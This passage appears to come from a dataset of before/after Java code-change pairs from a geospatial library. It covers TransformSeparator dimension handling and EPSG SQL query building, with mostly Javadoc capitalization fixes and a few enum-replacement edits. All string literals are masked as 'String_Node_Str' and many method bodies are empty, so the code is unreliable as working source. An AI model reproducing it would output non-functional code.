  targetDimensions=add(targetDimensions,dimensions,transform.getTargetDimensions());
}","/** 
 * Adds output dimensions to keep in the separated transform. The given values are <em>target</em> dimension indices of the transform given to the constructor. <p>Constraints:</p> <ul> <li>All numbers shall be in the range 0 inclusive to   {@link MathTransform#getTargetDimensions()} exclusive.</li><li>The  {@code dimensions} values shall be in strictly increasing order.</li><li>The  {@code dimensions} values shall be greater than all values specified by all previous callsof this method since construction or since the last call to  {@link #clear()}.</li> </ul>
 * @param dimensions  a sequence of target dimensions to keep, in strictly increasing order.
 * @throws IllegalArgumentException if {@code dimensions} contains negative valuesor if values are not in a strictly increasing order.
 */
public void addTargetDimensions(final int... dimensions) throws IllegalArgumentException {
  ArgumentChecks.ensureNonNull(""String_Node_Str"",dimensions);
  targetDimensions=add(targetDimensions,dimensions,transform.getTargetDimensions());
}"
91837,"/** 
 * Separates the math transform specified at construction time for given dimension indices. This method creates a math transform that use only the   {@linkplain #addSourceDimensions(int) specifiedsource dimensions} and return only the {@linkplain #addTargetDimensions(int) specified target dimensions}. If the source or target dimensions were not specified, then they will be inferred as below: <ul class=""verbose""> <li>If source dimensions were unspecified, then the returned transform will keep at least all source dimensions needed for computing the specified target dimensions. In many cases the returned transform unconditionally keep all source dimensions, but not necessarily. If all source dimensions need to be kept, it is better to   {@linkplain #addSourceDimensionRange(int,int) specify that explicitely}.</li> <li>If target dimensions were unspecified, then the returned transform will expect only the specified source dimensions as inputs, and the target dimensions will be inferred automatically.</li> </ul> The source and target dimensions actually used can be queried by calls to   {@link #getSourceDimensions()}or   {@link #getTargetDimensions()} after this {@code separate()} method.
 * @return The separated math transform.
 * @throws FactoryException if the transform can not be separated.
 */
public MathTransform separate() throws FactoryException {
}","/** 
 * Separates the math transform specified at construction time for given dimension indices. This method creates a math transform that use only the   {@linkplain #addSourceDimensions(int) specifiedsource dimensions} and return only the {@linkplain #addTargetDimensions(int) specified target dimensions}. If the source or target dimensions were not specified, then they will be inferred as below: <ul class=""verbose""> <li>If source dimensions were unspecified, then the returned transform will keep at least all source dimensions needed for computing the specified target dimensions. In many cases the returned transform unconditionally keep all source dimensions, but not necessarily. If all source dimensions need to be kept, it is better to   {@linkplain #addSourceDimensionRange(int,int) specify that explicitely}.</li> <li>If target dimensions were unspecified, then the returned transform will expect only the specified source dimensions as inputs, and the target dimensions will be inferred automatically.</li> </ul> The source and target dimensions actually used can be queried by calls to   {@link #getSourceDimensions()}or   {@link #getTargetDimensions()} after this {@code separate()} method.
 * @return the separated math transform.
 * @throws FactoryException if the transform can not be separated.
 */
public MathTransform separate() throws FactoryException {
}"
91838,"/** 
 * Returns   {@code true} if the given sequence contains all index in the range {@code lower} inclusiveto  {@code upper} exclusive.
 * @param sequence The {@link #sourceDimensions} or {@link #targetDimensions} sequence to test.
 * @param lower    The lower value, inclusive.
 * @param upper    The upper value, exclusive.
 * @return {@code true} if the full range was found in the sequence.
 */
private static boolean containsAll(final int[] sequence,final int lower,int upper){
}","/** 
 * Returns   {@code true} if the given sequence contains all index in the range {@code lower} inclusiveto  {@code upper} exclusive.
 * @param sequence  the {@link #sourceDimensions} or {@link #targetDimensions} sequence to test.
 * @param lower     the lower value, inclusive.
 * @param upper     the upper value, exclusive.
 * @return {@code true} if the full range was found in the sequence.
 */
private static boolean containsAll(final int[] sequence,final int lower,int upper){
}"
91839,"/** 
 * Creates a transform for the same mathematic than the given   {@code step}but expecting only the given dimensions as inputs. This method is invoked by   {@link #separate()} when user-specified source dimensions need to be taken in account.The given  {@code step} and {@code dimensions} are typically the values of{@link #transform} and {@link #sourceDimensions} fields respectively, but not necessarily.In particular those arguments will differ when this method is invoked recursively for processing concatenated or  {@linkplain PassThroughTransform#getSubTransform() sub-transforms}. <p>Subclasses can override this method if they need to handle some   {@code MathTransform} implementationsin a special way. However all implementations of this method shall obey to the following contract:</p> <ul class=""verbose""> <li> {@link #sourceDimensions} and {@link #targetDimensions} should not be assumed accuratesince they may be temporarily outdated or modified during recursive calls to this method.</li> <li> {@link #sourceDimensions} should not be modified by this method.</li><li> {@link #targetDimensions} <strong>must</strong> be <em>overwritten</em> (not updated) by this method to thesequence of all target dimensions of  {@code step} that are also target dimensions of the returned transform.The indices shall be in strictly increasing order from 0 inclusive to {@code step.getTargetDimensions()} exclusive.</li></ul>
 * @param step The transform for which to retain only a subset of the source dimensions.
 * @param dimensions Indices of the source dimensions of {@code step} to retain.
 * @return A transform expecting only the given source dimensions.
 * @throws FactoryException if the given transform is not separable.
 */
@SuppressWarnings(""String_Node_Str"") protected MathTransform filterSourceDimensions(final MathTransform step,final int[] dimensions) throws FactoryException {
}","/** 
 * Creates a transform for the same mathematic than the given   {@code step}but expecting only the given dimensions as inputs. This method is invoked by   {@link #separate()} when user-specified source dimensions need to be taken in account.The given  {@code step} and {@code dimensions} are typically the values of{@link #transform} and {@link #sourceDimensions} fields respectively, but not necessarily.In particular those arguments will differ when this method is invoked recursively for processing concatenated or  {@linkplain PassThroughTransform#getSubTransform() sub-transforms}. <p>Subclasses can override this method if they need to handle some   {@code MathTransform} implementationsin a special way. However all implementations of this method shall obey to the following contract:</p> <ul class=""verbose""> <li> {@link #sourceDimensions} and {@link #targetDimensions} should not be assumed accuratesince they may be temporarily outdated or modified during recursive calls to this method.</li> <li> {@link #sourceDimensions} should not be modified by this method.</li><li> {@link #targetDimensions} <strong>must</strong> be <em>overwritten</em> (not updated) by this method to thesequence of all target dimensions of  {@code step} that are also target dimensions of the returned transform.The indices shall be in strictly increasing order from 0 inclusive to {@code step.getTargetDimensions()} exclusive.</li></ul>
 * @param step  the transform for which to retain only a subset of the source dimensions.
 * @param dimensions  indices of the source dimensions of {@code step} to retain.
 * @return a transform expecting only the given source dimensions.
 * @throws FactoryException if the given transform is not separable.
 */
@SuppressWarnings(""String_Node_Str"") protected MathTransform filterSourceDimensions(final MathTransform step,final int[] dimensions) throws FactoryException {
}"
91840,"/** 
 * Returns   {@code true} if the given sequence contains any value in the given range.
 * @param sequence The {@link #sourceDimensions} or {@link #targetDimensions} sequence to test.
 * @param lower    The lower value, inclusive.
 * @param upper    The upper value, exclusive.
 * @return {@code true} if the sequence contains at least one value in the given range.
 */
private static boolean containsAny(final int[] sequence,final int lower,final int upper){
}","/** 
 * Returns   {@code true} if the given sequence contains any value in the given range.
 * @param sequence  the {@link #sourceDimensions} or {@link #targetDimensions} sequence to test.
 * @param lower     the lower value, inclusive.
 * @param upper     the upper value, exclusive.
 * @return {@code true} if the sequence contains at least one value in the given range.
 */
private static boolean containsAny(final int[] sequence,final int lower,final int upper){
}"
91841,"/** 
 * Inserts the specified   {@code dimension} in the specified sequence at a position that preserve increasing order.This method does nothing if the given dimension already exists in the given array. <div class=""note""><b>Note:</b> we do not provide public API for this method because we rather encourage bulk operations (adding many values at once), and because the public API does not allow to specify values in random order (for avoiding risk of confusion as some users could expect the separated transform to use the dimensions in the order he specified them).</div>
 * @param sequence   The {@link #sourceDimensions} or {@link #targetDimensions} sequence to update.
 * @param dimension  The value to add to the given sequence.
 */
private static int[] insert(int[] sequence,int dimension) throws IllegalArgumentException {
}","/** 
 * Inserts the specified   {@code dimension} in the specified sequence at a position that preserve increasing order.This method does nothing if the given dimension already exists in the given array. <div class=""note""><b>Note:</b> we do not provide public API for this method because we rather encourage bulk operations (adding many values at once), and because the public API does not allow to specify values in random order (for avoiding risk of confusion as some users could expect the separated transform to use the dimensions in the order he specified them).</div>
 * @param sequence   the {@link #sourceDimensions} or {@link #targetDimensions} sequence to update.
 * @param dimension  the value to add to the given sequence.
 */
private static int[] insert(int[] sequence,int dimension) throws IllegalArgumentException {
}"
91842,"/** 
 * Adds a range of output dimensions to keep in the separated transform. The   {@code lower} and {@code upper} values define a range of <em>target</em> dimension indicesof the transform given to the constructor.
 * @param lower The lower dimension, inclusive. Shall not be smaller than 0.
 * @param upper The upper dimension, exclusive. Shall be smaller than {@link MathTransform#getTargetDimensions()}.
 * @throws IllegalArgumentException if {@code lower} or {@code upper} are out of bounds.
 */
public void addTargetDimensionRange(final int lower,final int upper) throws IllegalArgumentException {
  targetDimensions=add(targetDimensions,lower,upper,transform.getTargetDimensions());
}","/** 
 * Adds a range of output dimensions to keep in the separated transform. The   {@code lower} and {@code upper} values define a range of <em>target</em> dimension indicesof the transform given to the constructor.
 * @param lower  the lower dimension, inclusive. Shall not be smaller than 0.
 * @param upper  the upper dimension, exclusive. Shall be smaller than {@link MathTransform#getTargetDimensions()}.
 * @throws IllegalArgumentException if {@code lower} or {@code upper} are out of bounds.
 */
public void addTargetDimensionRange(final int lower,final int upper) throws IllegalArgumentException {
  targetDimensions=add(targetDimensions,lower,upper,transform.getTargetDimensions());
}"
91843,"/** 
 * Adds input dimensions to keep in the separated transform. The given values are <em>source</em> dimension indices of the transform given to the constructor. <p>Constraints:</p> <ul> <li>All numbers shall be in the range 0 inclusive to   {@link MathTransform#getSourceDimensions()} exclusive.</li><li>The  {@code dimensions} values shall be in strictly increasing order.</li><li>The  {@code dimensions} values shall be greater than all values specified by all previous callsof this method since construction or since the last call to  {@link #clear()}.</li> </ul>
 * @param dimensions A sequence of source dimensions to keep, in strictly increasing order.
 * @throws IllegalArgumentException if {@code dimensions} contains negative valuesor if values are not in a strictly increasing order.
 */
public void addSourceDimensions(final int... dimensions) throws IllegalArgumentException {
  ArgumentChecks.ensureNonNull(""String_Node_Str"",dimensions);
  sourceDimensions=add(sourceDimensions,dimensions,transform.getSourceDimensions());
}","/** 
 * Adds input dimensions to keep in the separated transform. The given values are <em>source</em> dimension indices of the transform given to the constructor. <p>Constraints:</p> <ul> <li>All numbers shall be in the range 0 inclusive to   {@link MathTransform#getSourceDimensions()} exclusive.</li><li>The  {@code dimensions} values shall be in strictly increasing order.</li><li>The  {@code dimensions} values shall be greater than all values specified by all previous callsof this method since construction or since the last call to  {@link #clear()}.</li> </ul>
 * @param dimensions  a sequence of source dimensions to keep, in strictly increasing order.
 * @throws IllegalArgumentException if {@code dimensions} contains negative valuesor if values are not in a strictly increasing order.
 */
public void addSourceDimensions(final int... dimensions) throws IllegalArgumentException {
  ArgumentChecks.ensureNonNull(""String_Node_Str"",dimensions);
  sourceDimensions=add(sourceDimensions,dimensions,transform.getSourceDimensions());
}"
91844,"/** 
 * Returns the input dimensions to keep or kept in the separated transform. This method performs the first applicable action in the following list: <ol class=""verbose""> <li>Source dimensions have been explicitly set by at least one call to   {@link #addSourceDimensions(int)}or   {@link #addSourceDimensionRange(int,int)} since construction or since last call to {@link #clear()}. In such case, this method returns all specified source dimensions.</li> <li>No source dimensions were set but   {@link #separate()} has been invoked.In such case, this method returns the sequence of source dimensions that  {@code separate()} chooses to retain.It is often, but not necessarily, all source dimensions of the transform given at construction time.</li> <li>Otherwise an exception is thrown.</li> </ol>
 * @return The input dimension as a sequence of strictly increasing values.
 * @throws IllegalStateException if input dimensions have not been set and{@link #separate()} has not yet been invoked.
 */
public int[] getSourceDimensions() throws IllegalStateException {
  if (sourceDimensions != null) {
    return sourceDimensions.clone();
  }
  throw new IllegalStateException(Errors.format(Errors.Keys.UnspecifiedDimensions));
}","/** 
 * Returns the input dimensions to keep or kept in the separated transform. This method performs the first applicable action in the following list: <ol class=""verbose""> <li>Source dimensions have been explicitly set by at least one call to   {@link #addSourceDimensions(int)}or   {@link #addSourceDimensionRange(int,int)} since construction or since last call to {@link #clear()}. In such case, this method returns all specified source dimensions.</li> <li>No source dimensions were set but   {@link #separate()} has been invoked.In such case, this method returns the sequence of source dimensions that  {@code separate()} chooses to retain.It is often, but not necessarily, all source dimensions of the transform given at construction time.</li> <li>Otherwise an exception is thrown.</li> </ol>
 * @return the input dimension as a sequence of strictly increasing values.
 * @throws IllegalStateException if input dimensions have not been set and{@link #separate()} has not yet been invoked.
 */
public int[] getSourceDimensions() throws IllegalStateException {
  if (sourceDimensions != null) {
    return sourceDimensions.clone();
  }
  throw new IllegalStateException(Errors.format(Errors.Keys.UnspecifiedDimensions));
}"
91845,"/** 
 * Constructs a separator for the given transform and using the given factory.
 * @param transform The transform to separate.
 * @param factory The factory to use for creating new math transforms.
 */
public TransformSeparator(final MathTransform transform,final MathTransformFactory factory){
  ArgumentChecks.ensureNonNull(""String_Node_Str"",transform);
  ArgumentChecks.ensureNonNull(""String_Node_Str"",factory);
  this.transform=transform;
  this.factory=factory;
}","/** 
 * Constructs a separator for the given transform and using the given factory.
 * @param transform  the transform to separate.
 * @param factory    the factory to use for creating new math transforms.
 */
public TransformSeparator(final MathTransform transform,final MathTransformFactory factory){
  ArgumentChecks.ensureNonNull(""String_Node_Str"",transform);
  ArgumentChecks.ensureNonNull(""String_Node_Str"",factory);
  this.transform=transform;
  this.factory=factory;
}"
91846,"/** 
 * Returns the output dimensions to keep or kept in the separated transform. This method performs the first applicable action in the following list: <ol class=""verbose""> <li>Target dimensions have been explicitly set by at least one call to   {@link #addTargetDimensions(int)}or   {@link #addTargetDimensionRange(int,int)} since construction or since last call to {@link #clear()}. In such case, this method returns all specified target dimensions.</li> <li>No target dimensions were set but   {@link #separate()} has been invoked.In such case, the target dimensions are inferred automatically from the  {@linkplain #getSourceDimensions() source dimensions} and the transform.</li><li>Otherwise an exception is thrown.</li> </ol>
 * @return The output dimension as a sequence of strictly increasing values.
 * @throws IllegalStateException if output dimensions have not been set and{@link #separate()} has not yet been invoked.
 */
public int[] getTargetDimensions() throws IllegalStateException {
  if (targetDimensions != null) {
    return targetDimensions.clone();
  }
  throw new IllegalStateException(Errors.format(Errors.Keys.UnspecifiedDimensions));
}","/** 
 * Returns the output dimensions to keep or kept in the separated transform. This method performs the first applicable action in the following list: <ol class=""verbose""> <li>Target dimensions have been explicitly set by at least one call to   {@link #addTargetDimensions(int)}or   {@link #addTargetDimensionRange(int,int)} since construction or since last call to {@link #clear()}. In such case, this method returns all specified target dimensions.</li> <li>No target dimensions were set but   {@link #separate()} has been invoked.In such case, the target dimensions are inferred automatically from the  {@linkplain #getSourceDimensions() source dimensions} and the transform.</li><li>Otherwise an exception is thrown.</li> </ol>
 * @return the output dimension as a sequence of strictly increasing values.
 * @throws IllegalStateException if output dimensions have not been set and{@link #separate()} has not yet been invoked.
 */
public int[] getTargetDimensions() throws IllegalStateException {
  if (targetDimensions != null) {
    return targetDimensions.clone();
  }
  throw new IllegalStateException(Errors.format(Errors.Keys.UnspecifiedDimensions));
}"
91847,"/** 
 * Creates a transform for the same mathematic than the given   {@code step}but producing only the given dimensions as outputs. This method is invoked by   {@link #separate()} when user-specified target dimensions need to be taken in account.The given  {@code step} and {@code dimensions} are typically the values of{@link #transform} and {@link #targetDimensions} fields respectively, but not necessarily.<p>Subclasses can override this method if they need to handle some  {@code MathTransform} implementationsin a special way. However all implementations of this method shall obey to the following contract:</p> <ul> <li> {@link #sourceDimensions} and {@link #targetDimensions} should not be assumed accurate.</li><li> {@link #sourceDimensions} should not be modified by this method.</li><li> {@link #targetDimensions} should not be modified by this method.</li></ul> The number and nature of inputs stay unchanged. For example if the supplied  {@code transform}has (<var>longitude</var>, <var>latitude</var>, <var>height</var>) outputs, then a filtered transform may keep only the (<var>longitude</var>, <var>latitude</var>) part for the same inputs. In most cases, the filtered transform is non-invertible since it loose informations.
 * @param step The transform for which to retain only a subset of the target dimensions.
 * @param dimensions Indices of the target dimensions of {@code step} to retain.
 * @return A transform producing only the given target dimensions.
 * @throws FactoryException if the given transform is not separable.
 */
protected MathTransform filterTargetDimensions(MathTransform step,final int[] dimensions) throws FactoryException {
  final int numSrc=step.getSourceDimensions();
  int numTgt=step.getTargetDimensions();
  final int lower=dimensions[0];
  final int upper=dimensions[dimensions.length - 1];
  if (lower == 0 && upper == numTgt && dimensions.length == numTgt) {
    return step;
  }
  int removeAt=0;
  int numRemoved=0;
  if (step instanceof PassThroughTransform) {
    final PassThroughTransform passThrough=(PassThroughTransform)step;
    final int subLower=passThrough.firstAffectedOrdinate;
    final int numSubTgt=passThrough.subTransform.getTargetDimensions();
    if (!containsAny(dimensions,subLower,subLower + numSubTgt)) {
      step=IdentityTransform.create(numTgt=numSrc);
      removeAt=subLower;
      numRemoved=numSubTgt - passThrough.subTransform.getSourceDimensions();
    }
  }
  final Matrix matrix=Matrices.createZero(dimensions.length + 1,numTgt + 1);
  for (int j=0; j < dimensions.length; j++) {
    int i=dimensions[j];
    if (i >= removeAt) {
      i-=numRemoved;
    }
    matrix.setElement(j,i,1);
  }
  matrix.setElement(dimensions.length,numTgt,1);
  return factory.createConcatenatedTransform(step,factory.createAffineTransform(matrix));
}","/** 
 * Creates a transform for the same mathematic than the given   {@code step}but producing only the given dimensions as outputs. This method is invoked by   {@link #separate()} when user-specified target dimensions need to be taken in account.The given  {@code step} and {@code dimensions} are typically the values of{@link #transform} and {@link #targetDimensions} fields respectively, but not necessarily.<p>Subclasses can override this method if they need to handle some  {@code MathTransform} implementationsin a special way. However all implementations of this method shall obey to the following contract:</p> <ul> <li> {@link #sourceDimensions} and {@link #targetDimensions} should not be assumed accurate.</li><li> {@link #sourceDimensions} should not be modified by this method.</li><li> {@link #targetDimensions} should not be modified by this method.</li></ul> The number and nature of inputs stay unchanged. For example if the supplied  {@code transform}has (<var>longitude</var>, <var>latitude</var>, <var>height</var>) outputs, then a filtered transform may keep only the (<var>longitude</var>, <var>latitude</var>) part for the same inputs. In most cases, the filtered transform is non-invertible since it loose informations.
 * @param step  the transform for which to retain only a subset of the target dimensions.
 * @param dimensions  indices of the target dimensions of {@code step} to retain.
 * @return a transform producing only the given target dimensions.
 * @throws FactoryException if the given transform is not separable.
 */
protected MathTransform filterTargetDimensions(MathTransform step,final int[] dimensions) throws FactoryException {
  final int numSrc=step.getSourceDimensions();
  int numTgt=step.getTargetDimensions();
  final int lower=dimensions[0];
  final int upper=dimensions[dimensions.length - 1];
  if (lower == 0 && upper == numTgt && dimensions.length == numTgt) {
    return step;
  }
  int removeAt=0;
  int numRemoved=0;
  if (step instanceof PassThroughTransform) {
    final PassThroughTransform passThrough=(PassThroughTransform)step;
    final int subLower=passThrough.firstAffectedOrdinate;
    final int numSubTgt=passThrough.subTransform.getTargetDimensions();
    if (!containsAny(dimensions,subLower,subLower + numSubTgt)) {
      step=IdentityTransform.create(numTgt=numSrc);
      removeAt=subLower;
      numRemoved=numSubTgt - passThrough.subTransform.getSourceDimensions();
    }
  }
  final Matrix matrix=Matrices.createZero(dimensions.length + 1,numTgt + 1);
  for (int j=0; j < dimensions.length; j++) {
    int i=dimensions[j];
    if (i >= removeAt) {
      i-=numRemoved;
    }
    matrix.setElement(j,i,1);
  }
  matrix.setElement(dimensions.length,numTgt,1);
  return factory.createConcatenatedTransform(step,factory.createAffineTransform(matrix));
}"
91848,"/** 
 * Creates a new map of authority codes for the specified type.
 * @param connection The connection to the EPSG database.
 * @param table      The table to query.
 * @param type       The type to query.
 * @param factory    The factory originator.
 */
AuthorityCodes(final Connection connection,final TableInfo table,final Class<?> type,final EPSGDataAccess factory) throws SQLException {
  this.factory=factory;
  final StringBuilder buffer=new StringBuilder(100);
  final int columnNameStart=buffer.append(""String_Node_Str"").length();
  final int columnNameEnd=buffer.append(table.codeColumn).length();
  buffer.append(""String_Node_Str"").append(table.table);
  boolean hasWhere=false;
  Class<?> tableType=table.type;
  if (table.typeColumn != null) {
    for (int i=0; i < table.subTypes.length; i++) {
      final Class<?> candidate=table.subTypes[i];
      if (candidate.isAssignableFrom(type)) {
        buffer.append(""String_Node_Str"").append(table.typeColumn).append(""String_Node_Str"").append(table.typeNames[i]).append(""String_Node_Str"");
        hasWhere=true;
        tableType=candidate;
        break;
      }
    }
  }
  buffer.append(hasWhere ? ""String_Node_Str"" : ""String_Node_Str"");
  final int conditionStart=buffer.length();
  if (table.showColumn != null) {
    buffer.append(table.showColumn).append(""String_Node_Str"");
  }
  buffer.append(""String_Node_Str"").append(table.codeColumn);
  sql[ALL]=factory.translator.apply(buffer.toString());
  buffer.setLength(conditionStart);
  if (table.nameColumn != null) {
    buffer.replace(columnNameStart,columnNameEnd,table.nameColumn);
  }
  buffer.append(table.codeColumn).append(""String_Node_Str"");
  sql[ONE]=factory.translator.apply(buffer.toString());
  this.type=tableType;
  isProjection=Projection.class.isAssignableFrom(tableType);
}","/** 
 * Creates a new map of authority codes for the specified type.
 * @param connection The connection to the EPSG database.
 * @param table      The table to query.
 * @param type       The type to query.
 * @param factory    The factory originator.
 */
AuthorityCodes(final Connection connection,final TableInfo table,final Class<?> type,final EPSGDataAccess factory) throws SQLException {
  this.factory=factory;
  final StringBuilder buffer=new StringBuilder(100);
  final int columnNameStart=buffer.append(""String_Node_Str"").length();
  final int columnNameEnd=buffer.append(table.codeColumn).length();
  buffer.append(""String_Node_Str"").append(table.table);
  boolean hasWhere=false;
  Class<?> tableType=table.type;
  if (table.typeColumn != null) {
    for (int i=0; i < table.subTypes.length; i++) {
      final Class<?> candidate=table.subTypes[i];
      if (candidate.isAssignableFrom(type)) {
        buffer.append(""String_Node_Str"").append(table.typeColumn).append(""String_Node_Str"").append(TableInfo.ENUM_REPLACEMENT).append(""String_Node_Str"").append(table.typeNames[i]).append(""String_Node_Str"");
        hasWhere=true;
        tableType=candidate;
        break;
      }
    }
  }
  buffer.append(hasWhere ? ""String_Node_Str"" : ""String_Node_Str"");
  final int conditionStart=buffer.length();
  if (table.showColumn != null) {
    buffer.append(table.showColumn).append(""String_Node_Str"");
  }
  buffer.append(""String_Node_Str"").append(table.codeColumn);
  sql[ALL]=factory.translator.apply(buffer.toString());
  buffer.setLength(conditionStart);
  if (table.nameColumn != null) {
    buffer.replace(columnNameStart,columnNameEnd,table.nameColumn);
  }
  buffer.append(table.codeColumn).append(""String_Node_Str"");
  sql[ONE]=factory.translator.apply(buffer.toString());
  this.type=tableType;
  isProjection=Projection.class.isAssignableFrom(tableType);
}"
91849,"/** 
 * Returns   {@code true} if the {@link CoordinateOperation} for the specified code is a {@link Projection}. The caller must have verified that the designed operation is a   {@link Conversion} before to invoke this method.
 * @throws SQLException If an error occurred while querying the database.
 */
final boolean isProjection(final Integer code) throws SQLException {
  Boolean projection=isProjection.get(code);
  if (projection == null) {
    try (ResultSet result=executeQuery(""String_Node_Str"",""String_Node_Str"" + ""String_Node_Str"" + ""String_Node_Str""+ ""String_Node_Str"",code)){
      projection=result.next();
    }
     isProjection.put(code,projection);
  }
  return projection;
}","/** 
 * Returns   {@code true} if the {@link CoordinateOperation} for the specified code is a {@link Projection}. The caller must have verified that the designed operation is a   {@link Conversion} before to invoke this method.
 * @throws SQLException If an error occurred while querying the database.
 */
final boolean isProjection(final Integer code) throws SQLException {
  Boolean projection=isProjection.get(code);
  if (projection == null) {
    try (ResultSet result=executeQuery(""String_Node_Str"",""String_Node_Str"" + ""String_Node_Str"" + ""String_Node_Str""+ ""String_Node_Str"" + TableInfo.ENUM_REPLACEMENT + ""String_Node_Str"",code)){
      projection=result.next();
    }
     isProjection.put(code,projection);
  }
  return projection;
}"
91850,"/** 
 * Creates immediately a schema of the given name in the database and remember that the  {@code ""epsg_""} prefix in table names will need to be replaced by path to that schema.<p>This method should be invoked only once. It does nothing if the database does not supports schema.</p>
 * @param schema The schema (usually {@code ""epsg""}).
 * @throws SQLException if the schema can not be created.
 * @throws IOException if an I/O operation was required and failed.
 */
public void setSchema(final String schema) throws SQLException, IOException {
  if (isSchemaSupported) {
    execute(new StringBuilder(""String_Node_Str"").append(schema));
    if (isGrantOnSchemaSupported) {
      execute(new StringBuilder(""String_Node_Str"").append(schema).append(""String_Node_Str"").append(PUBLIC));
    }
    addReplacement(SQLTranslator.TABLE_PREFIX + ""String_Node_Str"",""String_Node_Str"");
    addReplacement(SQLTranslator.TABLE_PREFIX + ""String_Node_Str"",""String_Node_Str"");
    addReplacement(SQLTranslator.TABLE_PREFIX + ""String_Node_Str"",""String_Node_Str"");
    addReplacement(SQLTranslator.TABLE_PREFIX + ""String_Node_Str"",""String_Node_Str"");
    addReplacement(SQLTranslator.TABLE_PREFIX + ""String_Node_Str"",""String_Node_Str"");
    addReplacement(SQLTranslator.TABLE_PREFIX + ""String_Node_Str"",""String_Node_Str"");
    addReplacement(SQLTranslator.TABLE_PREFIX + ""String_Node_Str"",""String_Node_Str"");
    addReplacement(SQLTranslator.TABLE_PREFIX + ""String_Node_Str"",""String_Node_Str"");
    addReplacement(SQLTranslator.TABLE_PREFIX + ""String_Node_Str"",""String_Node_Str"");
    addReplacement(SQLTranslator.TABLE_PREFIX + ""String_Node_Str"",""String_Node_Str"");
    addReplacement(SQLTranslator.TABLE_PREFIX + ""String_Node_Str"",""String_Node_Str"");
    addReplacement(SQLTranslator.TABLE_PREFIX + ""String_Node_Str"",""String_Node_Str"");
    addReplacement(SQLTranslator.TABLE_PREFIX + ""String_Node_Str"",""String_Node_Str"");
    addReplacement(SQLTranslator.TABLE_PREFIX + ""String_Node_Str"",""String_Node_Str"");
    addReplacement(SQLTranslator.TABLE_PREFIX + ""String_Node_Str"",""String_Node_Str"");
    addReplacement(SQLTranslator.TABLE_PREFIX + ""String_Node_Str"",""String_Node_Str"");
    addReplacement(SQLTranslator.TABLE_PREFIX + ""String_Node_Str"",""String_Node_Str"");
    addReplacement(SQLTranslator.TABLE_PREFIX + ""String_Node_Str"",""String_Node_Str"");
    addReplacement(SQLTranslator.TABLE_PREFIX + ""String_Node_Str"",""String_Node_Str"");
    addReplacement(SQLTranslator.TABLE_PREFIX + ""String_Node_Str"",""String_Node_Str"");
    addReplacement(SQLTranslator.TABLE_PREFIX + ""String_Node_Str"",""String_Node_Str"");
    if (isEnumTypeSupported) {
      addReplacement(SQLTranslator.TABLE_PREFIX + ""String_Node_Str"",""String_Node_Str"");
      addReplacement(SQLTranslator.TABLE_PREFIX + ""String_Node_Str"",""String_Node_Str"");
      addReplacement(SQLTranslator.TABLE_PREFIX + ""String_Node_Str"",""String_Node_Str"");
      addReplacement(SQLTranslator.TABLE_PREFIX + ""String_Node_Str"",""String_Node_Str"");
    }
    prependNamespace(schema);
  }
  if (!isEnumTypeSupported) {
    addReplacement(SQLTranslator.TABLE_PREFIX + ""String_Node_Str"",""String_Node_Str"");
    addReplacement(SQLTranslator.TABLE_PREFIX + ""String_Node_Str"",""String_Node_Str"");
    addReplacement(SQLTranslator.TABLE_PREFIX + ""String_Node_Str"",""String_Node_Str"");
    addReplacement(SQLTranslator.TABLE_PREFIX + ""String_Node_Str"",""String_Node_Str"");
  }
}","/** 
 * Creates immediately a schema of the given name in the database and remember that the  {@code ""epsg_""} prefix in table names will need to be replaced by path to that schema.<p>This method should be invoked only once. It does nothing if the database does not supports schema.</p>
 * @param schema The schema (usually {@code ""epsg""}).
 * @throws SQLException if the schema can not be created.
 * @throws IOException if an I/O operation was required and failed.
 */
public void setSchema(final String schema) throws SQLException, IOException {
  if (isSchemaSupported) {
    execute(new StringBuilder(""String_Node_Str"").append(schema));
    if (isGrantOnSchemaSupported) {
      execute(new StringBuilder(""String_Node_Str"").append(schema).append(""String_Node_Str"").append(PUBLIC));
    }
    addReplacement(SQLTranslator.TABLE_PREFIX + ""String_Node_Str"",""String_Node_Str"");
    addReplacement(SQLTranslator.TABLE_PREFIX + ""String_Node_Str"",""String_Node_Str"");
    addReplacement(SQLTranslator.TABLE_PREFIX + ""String_Node_Str"",""String_Node_Str"");
    addReplacement(SQLTranslator.TABLE_PREFIX + ""String_Node_Str"",""String_Node_Str"");
    addReplacement(SQLTranslator.TABLE_PREFIX + ""String_Node_Str"",""String_Node_Str"");
    addReplacement(SQLTranslator.TABLE_PREFIX + ""String_Node_Str"",""String_Node_Str"");
    addReplacement(SQLTranslator.TABLE_PREFIX + ""String_Node_Str"",""String_Node_Str"");
    addReplacement(SQLTranslator.TABLE_PREFIX + ""String_Node_Str"",""String_Node_Str"");
    addReplacement(SQLTranslator.TABLE_PREFIX + ""String_Node_Str"",""String_Node_Str"");
    addReplacement(SQLTranslator.TABLE_PREFIX + ""String_Node_Str"",""String_Node_Str"");
    addReplacement(SQLTranslator.TABLE_PREFIX + ""String_Node_Str"",""String_Node_Str"");
    addReplacement(SQLTranslator.TABLE_PREFIX + ""String_Node_Str"",""String_Node_Str"");
    addReplacement(SQLTranslator.TABLE_PREFIX + ""String_Node_Str"",""String_Node_Str"");
    addReplacement(SQLTranslator.TABLE_PREFIX + ""String_Node_Str"",""String_Node_Str"");
    addReplacement(SQLTranslator.TABLE_PREFIX + ""String_Node_Str"",""String_Node_Str"");
    addReplacement(SQLTranslator.TABLE_PREFIX + ""String_Node_Str"",""String_Node_Str"");
    addReplacement(SQLTranslator.TABLE_PREFIX + ""String_Node_Str"",""String_Node_Str"");
    addReplacement(SQLTranslator.TABLE_PREFIX + ""String_Node_Str"",""String_Node_Str"");
    addReplacement(SQLTranslator.TABLE_PREFIX + ""String_Node_Str"",""String_Node_Str"");
    addReplacement(SQLTranslator.TABLE_PREFIX + ""String_Node_Str"",""String_Node_Str"");
    addReplacement(SQLTranslator.TABLE_PREFIX + ""String_Node_Str"",""String_Node_Str"");
    if (isEnumTypeSupported) {
      addReplacement(SQLTranslator.TABLE_PREFIX + ""String_Node_Str"",""String_Node_Str"");
      addReplacement(SQLTranslator.TABLE_PREFIX + ""String_Node_Str"",""String_Node_Str"");
      addReplacement(SQLTranslator.TABLE_PREFIX + ""String_Node_Str"",""String_Node_Str"");
      addReplacement(SQLTranslator.TABLE_PREFIX + ""String_Node_Str"",""String_Node_Str"");
    }
    prependNamespace(schema);
  }
  if (!isEnumTypeSupported) {
    addReplacement(SQLTranslator.TABLE_PREFIX + ""String_Node_Str"",TableInfo.ENUM_REPLACEMENT);
    addReplacement(SQLTranslator.TABLE_PREFIX + ""String_Node_Str"",TableInfo.ENUM_REPLACEMENT);
